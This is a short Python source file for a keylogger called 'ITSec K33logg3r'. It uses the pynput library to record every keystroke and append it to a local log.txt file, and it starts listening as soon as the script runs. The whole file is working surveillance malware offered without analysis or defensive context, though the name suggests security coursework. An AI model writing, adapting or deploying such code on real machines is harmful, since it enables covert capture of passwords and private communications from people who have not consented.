# ITSec K33logg3r
# Version: 2
# Author: George
# Date: 2023-05-30

import pynput.keyboard
class ITSecK33logg3r:
    def __init__(self):
        self.logger = ""
    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        with open("log.txt","a+",encoding="utf-8") as new_file:
            new_file.write(self.logger)
        #print(self.logger)
        self.logger = ""
    def evaluate_keys(self, key):
        try: 
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:	
                Pressed_key =  " "
            else:
                Pressed_key =  " " + str(key) + " "
        self.append_to_log(Pressed_key)
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

ITSecK33logg3r().start()